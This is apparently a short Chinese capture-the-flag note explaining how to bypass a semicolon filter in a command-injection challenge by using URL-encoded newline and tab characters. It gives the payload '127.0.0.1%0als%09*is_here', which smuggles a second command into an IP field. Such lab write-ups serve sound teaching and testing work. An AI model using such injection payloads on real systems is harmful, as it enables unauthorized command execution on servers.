## %0a 代替 ; 绕过

查看 flag_is_here 文件夹下的文件

```sh
# %0a - URL 编码的换行符（LF，ASCII 0x0A）
# 在命令行中，换行符可以用于分隔命令，可能用于注入额外命令
# %09 - URL 编码的水平制表符（TAB，ASCII 0x09）
# * 匹配任意字符
127.0.0.1%0als%09*is_here
```
